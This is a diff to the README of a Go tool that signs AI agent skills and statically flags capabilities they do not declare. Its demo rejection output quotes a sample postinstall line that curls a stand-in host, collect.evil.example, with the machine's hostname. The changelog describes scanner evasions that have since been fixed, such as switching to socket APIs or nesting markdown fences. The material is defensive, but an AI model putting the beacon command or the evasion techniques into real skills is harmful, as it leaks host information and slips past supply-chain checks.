@@ -9,7 +9,7 @@
 
 **Generate manifests, signatures and SBOMs, verify file integrity and identify statically observed undeclared capabilities.**
 
-`v0.8.0` · `Go 1.24+` · [Apache-2.0](LICENSE)
+`v0.9.0` · `Go 1.24+` · [Apache-2.0](LICENSE)
 
 [Website](https://skillprov.lei6393.com) · [Demo record](docs/demo-results.json)
 
@@ -87,7 +87,6 @@ verifying poisoned-skill
   - capabilities: UNDECLARED capability detected
 
  REJECTED
-  ✗ undeclared capability "env" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
   ✗ undeclared capability "exec" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
   ✗ undeclared capability "fs-write" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
   ✗ undeclared capability "net" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
@@ -118,6 +117,8 @@ Local signing, integrity checks, value-level capability comparison and a composi
 v0.7 tightens three verified gaps: the host-allowlist comparison now covers socket connects and dial addresses (`s.connect(("host", 443))`, `net.Dial("tcp", "host:443")`), so switching from curl to the socket API no longer evades it; a markdown code fence closes only on its own delimiter kind (a `~~~` line inside a ``` block is content, per CommonMark), so a nested opposite marker can no longer hide code from the scanner; and the SBOM tool metadata records the real generator version instead of the frozen 0.1.0 placeholder.
 
 v0.8 tightens two verified gaps: the host-allowlist comparison now covers Python's `http.client` constructor (`HTTPConnection("host", 443)` and `HTTPSConnection(...)`, including the bare call after a from-import), so switching to that API no longer evades it; and a malformed SKILL.md frontmatter is no longer silently swallowed — a frontmatter YAML error used to parse to an empty declaration set, distorting the emitted manifest and misleading the rejection message, while now both manifest and verify exit with a clear one-line error.
+
+v0.9 closes four verified scanner gaps: shell builtins such as `$HOME`/`$PATH` are no longer treated as an undeclared env capability, so an env:false skill that only reads `$HOME` is no longer falsely rejected; `|` operators and URL literals in code lines no longer produce phantom exec commands, so Python/JS lines such as `flags = a | b` or `url = "https://..."` no longer false-reject a finite exec allowlist; a markdown fence closes only on a bare delimiter line, so a line beginning with the marker plus a language name inside the block no longer ends it early and hides the remaining code; relative and home-relative shell redirects are now recorded as fs-write, so a skill declaring fs-write:false that writes a file no longer verifies green.
 
 - The public key travels in the bundle; current verification does not establish publisher identity trust. A valid signature does not establish skill safety.
 - This is static heuristic checking, not a runtime sandbox. PASS does not establish the absence of undetected behavior.
